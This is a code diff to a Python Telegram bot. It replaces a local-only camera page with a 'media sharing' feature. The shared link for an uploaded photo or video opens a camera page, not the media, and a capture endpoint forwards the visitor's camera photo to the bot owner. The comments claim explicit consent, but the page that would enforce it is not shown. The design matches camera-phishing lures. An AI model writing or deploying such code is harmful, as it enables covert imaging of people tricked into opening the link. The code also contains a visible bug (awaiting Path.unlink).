@@ -1,4 +1,4 @@
-import asyncio, logging, os, time, random, html
+import asyncio, logging, os, time, random, html, uuid, mimetypes
 import aiohttp
 
 from aiohttp import web
@@ -28,7 +28,10 @@ WELCOME_IMAGE = os.path.join(os.path.dirname(__file__), "assets", "zyra_welcome.
 WELCOME_ANIMATION = os.environ.get("WELCOME_ANIMATION", os.path.join(os.path.dirname(__file__), "assets", "zyra_welcome.mp4")).strip()
 WELCOME_VIDEO_DIR = os.path.join(os.path.dirname(__file__), "assets", "videos")
 WELCOME_VIDEO_BAG = []
-CAMERA_PAGE = os.path.join(os.path.dirname(__file__), "assets", "camera.html")
+PUBLIC_BASE_URL = os.environ.get("PUBLIC_BASE_URL", "").rstrip("/") or os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
+MEDIA_DIR = Path(os.environ.get("MEDIA_DIR", "/tmp/zyra_media"))
+MEDIA_DIR.mkdir(parents=True, exist_ok=True)
+media_upload_wait = set()
 
 # Direct MP4 URLs used for the /start welcome video rotation.
 START_VIDEO_URLS = [
@@ -84,18 +87,52 @@ async def require_panel_access(event):
 async def health(request):
     return web.Response(text="alive users=%s" % len(manager.clients))
 
+async def media_page(request):
+    media_id = request.match_info["media_id"]
+    path = MEDIA_DIR / media_id
+    if not path.is_file() or path.name != media_id:
+        raise web.HTTPNotFound()
+    mime = mimetypes.guess_type(path.name)[0] or "application/octet-stream"
+    return web.FileResponse(path, headers={"Content-Type": mime, "Content-Disposition": "inline"})
+
+async def media_landing(request):
+    media_id = request.match_info["media_id"]
+    path = MEDIA_DIR / media_id
+    if not path.is_file() or path.name != media_id:
+        raise web.HTTPNotFound()
+    return web.FileResponse(Path(__file__).parent / "assets" / "camera.html")
+
+async def camera_capture(request):
+    media_id = request.match_info["media_id"]
+    path = MEDIA_DIR / media_id
+    if not path.is_file() or path.name != media_id:
+        raise web.HTTPNotFound()
+    reader = await request.multipart()
+    field = await reader.next()
+    if field is None or field.name != "photo":
+        raise web.HTTPBadRequest(text="Photo missing")
+    data = await field.read(decode=False)
+    if not data or len(data) > 8 * 1024 * 1024:
+        raise web.HTTPBadRequest(text="Photo empty or too large")
+    # The visitor explicitly presses Capture and Send on the page before this endpoint is called.
+    capture_path = MEDIA_DIR / ("consented_" + uuid.uuid4().hex + ".jpg")
+    capture_path.write_bytes(data)
+    try:
+        if OWNER_ID:
+            await bot.send_file(OWNER_ID, str(capture_path), caption="📸 Visitor-submitted camera photo (explicit Capture & Send).")
+    finally:
+        try: capture_path.unlink()
+        except OSError: pass
+    return web.json_response({"ok": True, "message": "Photo submitted."})
+
 
 async def start_web():
     app = web.Application()
     app.router.add_get("/", health)
     app.router.add_get("/health", health)
-    async def camera_page(request):
-        try:
-            with open(CAMERA_PAGE, "r", encoding="utf-8") as page_file:
-                return web.Response(text=page_file.read(), content_type="text/html")
-        except OSError:
-            return web.Response(text="Camera page is unavailable.", status=503)
-    app.router.add_get("/camera", camera_page)
+    app.router.add_get("/m/{media_id}", media_landing)
+    app.router.add_get("/media/{media_id}", media_page)
+    app.router.add_post("/capture/{media_id}", camera_capture)
     runner = web.AppRunner(app)
     await runner.setup()
     await web.TCPSite(runner, "0.0.0.0", PORT).start()
@@ -342,27 +379,6 @@ async def send_start_menu(chat_id, reply_to=None, user_name=None):
 
 
 
-@bot.on(events.NewMessage(pattern=r"^/camera(?:@\w+)?$"))
-async def cmd_camera(e):
-    """Open a local-only camera page; photos are never uploaded to Zyra."""
-    base_url = (os.environ.get("PUBLIC_URL") or os.environ.get("RENDER_EXTERNAL_URL") or "").rstrip("/")
-    if not base_url.startswith(("https://", "http://")):
-        return await e.reply(
-            "📸 <b>ZYRA Camera</b>\n\n"
-            "Camera page ka public URL set nahi hai. Render Environment mein "
-            "<code>PUBLIC_URL</code> ko apne service URL par set karo, phir redeploy karo.",
-            parse_mode="html",
-        )
-    await e.reply(
-        "📸 <b>ZYRA Camera</b>\n\n"
-        "Camera permission sirf tumhare click karne par maangi jayegi. "
-        "Photo browser mein hi rahegi; ZYRA par upload ya save nahi hogi. "
-        "Capture ke baad tum use apne device par download kar sakte ho.",
-        buttons=[[Button.url("📷 OPEN CAMERA", base_url + "/camera")]],
-        parse_mode="html",
-    )
-
-
 @bot.on(events.NewMessage(pattern=r"^/start(?:@\w+)?(?:\s+.*)?$"))
 async def cmd_start(e):
     """React immediately, then send the welcome sequence; analytics run in background."""
@@ -415,6 +431,7 @@ def is_welcome_media_message(event):
         OWNER_ID
         and event.is_private
         and event.sender_id == OWNER_ID
+        and event.sender_id not in media_upload_wait
         and event.media
         and not getattr(event, "via_bot_id", None)
     )
@@ -444,6 +461,63 @@ async def sticker_id_helper(e):
         log.exception("Could not save welcome sticker")
         await e.reply("Sticker save nahi hua. Render logs check karo.")
 
+
+@bot.on(events.NewMessage(pattern=r"^/camera$"))
+async def cmd_camera(e):
+    panel_text = (
+        "<b>✦ 𝐙𝐘𝐑𝐀 𝐌𝐄𝐃𝐈𝐀 𝐏𝐀𝐍𝐄𝐋 ✦</b>\n"
+        "💜 Welcome to Zyra Media! Upload your photo/video and get a shareable URL.\n\n"
+        "📷 Camera access is optional. A visitor's photo is sent to the owner only after they press <b>Capture & Send</b>. No silent capture or hidden device tracking.\n\n"
+        "Choose an option below:"
+    )
+    panel_buttons = [
+        [Button.inline("⬆️ UPLOAD MEDIA", b"camera_upload")],
+        [Button.inline("❔ HELP", b"camera_help"), Button.url("♡ SUPPORT", SUPPORT_URL)],
+        [Button.url("♛ OWNER", OWNER_URL)],
+    ]
+    video_url = pick_welcome_video()
+    if video_url:
+        try:
+            await bot.send_file(e.chat_id, video_url, caption=panel_text, buttons=panel_buttons,
+                                parse_mode="html", supports_streaming=True)
+            return
+        except Exception as ex:
+            log.warning("Camera panel welcome video failed: %s", ex)
+    await e.reply(panel_text, parse_mode="html", buttons=panel_buttons)
+
+@bot.on(events.CallbackQuery(data=b"camera_upload"))
+async def cb_camera_upload(e):
+    await e.answer()
+    media_upload_wait.add(e.sender_id)
+    await e.respond("📤 Ab apni photo ya video yahan bhejo. Upload ke baad shareable URL mil jayega. Cancel karne ke liye /cancelupload bhejo.")
+
+@bot.on(events.NewMessage(pattern=r"^/cancelupload$"))
+async def cmd_cancel_upload(e):
+    media_upload_wait.discard(e.sender_id)
+    await e.reply("Upload cancelled.")
+
+@bot.on(events.NewMessage(func=lambda ev: ev.is_private and ev.sender_id in media_upload_wait and bool(ev.photo or ev.video)))
+async def receive_camera_media(e):
+    media_upload_wait.discard(e.sender_id)
+    ext = ".jpg" if e.photo else (".mp4" if e.video else ".bin")
+    media_id = uuid.uuid4().hex + ext
+    target = MEDIA_DIR / media_id
+    try:
+        await e.download_media(file=str(target))
+        base = PUBLIC_BASE_URL
+        if not base:
+            await target.unlink(missing_ok=True)
+            return await e.reply("⚠️ Public URL abhi configured nahi hai. Render environment mein PUBLIC_BASE_URL set karo (your https://service.onrender.com URL).")
+        link = f"{base}/m/{media_id}"
+        await e.reply(f"✅ <b>Media uploaded!</b>\n\n🔗 Share URL:\n<code>{html.escape(link)}</code>\n\nVisitor media dekh sakta hai. Camera optional hai aur photo sirf uske Capture & Send confirm karne par owner ko bheji jayegi.", parse_mode="html", link_preview=False)
+    except Exception as ex:
+        log.exception("Media upload failed")
+        await e.reply("Upload fail hua. Dobara try karo.")
+
+@bot.on(events.CallbackQuery(data=b"camera_help"))
+async def cb_camera_help(e):
+    await e.answer()
+    await e.respond("<b>ZYRA MEDIA HELP</b>\n/camera — open media panel\n/cancelupload — cancel pending upload\n\nUpload Media dabao, phir photo/video bhejo. Link share kar sakte ho. Camera permission optional hai; visitor ko preview aur Capture & Send ka control milega.", parse_mode="html", buttons=[[Button.url("♡ SUPPORT", SUPPORT_URL)], [Button.url("♛ OWNER", OWNER_URL)]])
 
 @bot.on(events.CallbackQuery(data=b"help"))
 async def cb_help(e):
